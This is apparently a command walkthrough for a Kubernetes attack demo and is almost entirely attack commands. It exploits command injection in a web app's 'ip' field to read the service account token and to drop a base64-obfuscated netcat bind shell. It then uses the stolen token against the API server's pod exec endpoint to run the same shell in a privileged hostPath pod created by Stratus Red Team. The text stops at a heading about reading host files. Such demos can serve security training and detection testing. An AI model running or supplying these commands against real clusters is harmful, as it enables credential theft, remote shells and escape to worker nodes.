kubectl apply -f .

kubectl get pods -A -w

export DEMO_POD=

kubectl port-forward $DEMO_POD -n dev 3000:8080

kubectl port-forward $DEMO_POD -n dev 9999:9999

127.0.0.1

; cat ../var/run/secrets/kubernetes.io/serviceaccount/token

curl --path-as-is -kis -X 'POST' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'ip=; echo cm0gLWYgL3RtcC9mOyBta2ZpZm8gL3RtcC9mOyBjYXQgL3RtcC9mIHwgL2Jpbi9zaCAtaSAyPiYxIHwgbmMgLWxwIDk5OTkgPiAvdG1wL2Y | base64 -d | tee /tmp/rev.sh; sh /tmp/rev.sh' \
    'http://localhost:3000/scanNetwork' &

nc 127.0.0.1 9999

script -qc /bin/bash /dev/null

APISERVER=https://kubernetes.default.svc \
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount \
NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace) \
TOKEN=$(cat ${SERVICEACCOUNT}/token) \
CACERT=${SERVICEACCOUNT}/ca.crt \

## Deploy Stratus Red Team detonation

curl -L -O https://github.com/DataDog/stratus-red-team/releases/download/v2.17.0/stratus-red-team_Linux_arm64.tar.gz
tar -xf stratus-red-team_Linux_arm64.tar.gz
./stratus detonate k8s.privilege-escalation.hostpath-volume


export STRATUS_POD=k8s.privilege-escalation.hostpath-volume
export STRATUS_NS=

curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET -s "${APISERVER}/api/v1/namespaces/$STRATUS_NS/pods" | grep security

curl --cacert ${CACERT} \
     --header "Authorization: Bearer ${TOKEN}" \
     -X GET "${APISERVER}/api/v1/namespaces/$STRATUS_NS/pods/$STRATUS_POD/exec?command=sh&command=-c&command=echo%20cm0gLXJmIC90bXAveDsgbWtmaWZvIC90bXAveDsgY2F0IC90bXAveCB8IC9iaW4vc2ggLWkgMj4mMSB8IG5jIC1scCA5OTk5ID4gL3RtcC94%20|%20base64%20-d%20|tee%20/tmp/rev.sh&tty=false&stdin=true&stderr=true&stdout=true" \
     -s \
     -H 'Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==' \
     -H 'Sec-WebSocket-Version: 13' \
     -H 'connection: upgrade' \
     -H 'upgrade: websocket' \
     --http1.1

curl --cacert ${CACERT} \
     --header "Authorization: Bearer ${TOKEN}" \
     -X GET "${APISERVER}/api/v1/namespaces/$STRATUS_NS/pods/$STRATUS_POD/exec?command=sh&command=-c&command=/bin/sh%20/tmp/rev.sh&tty=false&stdin=true&stderr=true&stdout=true" \
     -s \
     -H 'Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==' \
     -H 'Sec-WebSocket-Version: 13' \
     -H 'connection: upgrade' \
     -H 'upgrade: websocket' \
     --http1.1 \
     &

curl --cacert ${CACERT} \
     --header "Authorization: Bearer ${TOKEN}" \
     -X GET \
     -s \
     "${APISERVER}/api/v1/namespaces/$STRATUS_NS/pods/$STRATUS_POD" \
     | grep ip

nc $POD_IP 9999

### Read Hosts files since we are on a Worker Node and have the hostPath mount


